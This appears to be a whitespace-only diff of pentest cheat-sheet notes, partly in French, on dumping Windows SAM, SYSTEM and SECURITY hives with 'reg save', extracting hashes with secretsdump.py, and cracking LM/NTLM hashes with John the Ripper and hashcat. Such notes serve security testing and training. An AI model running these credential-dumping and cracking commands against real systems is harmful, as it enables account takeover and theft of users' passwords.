@@ -2,9 +2,9 @@
 
 Dump les fichiers de registre à l'aide de "REG SAVE" (nécessite les droits admin):
 ```
-	reg save HKLM\SAM C:\temp\sam
-	reg save HKLM\SYSTEM C:\temp\system 
-	reg save HKLM\SECURITY C:\temp\security
+reg save HKLM\SAM C:\temp\sam
+reg save HKLM\SYSTEM C:\temp\system 
+reg save HKLM\SECURITY C:\temp\security
 ```
 
 
@@ -12,13 +12,12 @@ Dump les fichiers de registre à l'aide de "REG SAVE" (nécessite les droits adm
 ## 2. Extract the windows local password hashes:
 
 ```
-	secretsdump.py -sam sam -security security -system system LOCAL
+secretsdump.py -sam sam -security security -system system LOCAL
 ```
 
 
 
 ## 3. Hash formats :
-
 
 Two types of hashes are present in SAM file
 	- LM (old storage method of Windows)
@@ -27,7 +26,7 @@ Two types of hashes are present in SAM file
 	
 Examples of hash
 
-		[username]::[LM]:[NTLM]:::
+	[username]::[LM]:[NTLM]:::
 
 ```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -45,14 +44,14 @@ User:1000:aad3b435b51404eeaad3b435b51404ee:0b82e1dace77e29dd1de00896ba1c5bc:::
 
 #### General commands and rules
 	
-		john [type of attack] --format=[hash of the format] 
+	john [type of attack] --format=[hash of the format] 
 			
-		--rules:Single
-		--rules:Wordlist
-		--rules:Extra
-		--rules:Jumbo (all the above)
-		--rules:KoreLogic
-		--rules:All (all the above)
+	--rules:Single
+	--rules:Wordlist
+	--rules:Extra
+	--rules:Jumbo (all the above)
+	--rules:KoreLogic
+	--rules:All (all the above)
 
 
 #### Cracking methodoloy :
@@ -81,14 +80,11 @@ Be careful, the rules=all parameter is very long. With a lot of hashes, this ope
 	
 The cracked hashes are located in the corresponding .pot file
 		
-		john --format=LM hashes.txt --show
-		john --format=NTLM hashes.txt --show
-
-
+	john --format=LM hashes.txt --show
+	john --format=NTLM hashes.txt --show
 
 
 ## 5. Hashcat - Crack the password hashes :
-
 
 #### General commands and rules
 ```			
@@ -128,12 +124,12 @@ You can beginning by a crack of the LM password, in the case of the some hash al
 	Try login=password 
 		hashcat -m 1000 hash.txt [LOGIN].txt
 			
-		3. Dictionnary attack
-			For LM hash :
-				hashcat -m 3000 -a 0 [Dictionnary].txt [Hash].txt --force
+3. Dictionnary attack
+	For LM hash :
+		hashcat -m 3000 -a 0 [Dictionnary].txt [Hash].txt --force
 			
-			For NTLM hash:
-				hashcat -m 1000 -a 0 [Dictionnary].txt [Hash].txt --force
+	For NTLM hash:
+		hashcat -m 1000 -a 0 [Dictionnary].txt [Hash].txt --force
 
 4. Dictionnary attack with rules
 
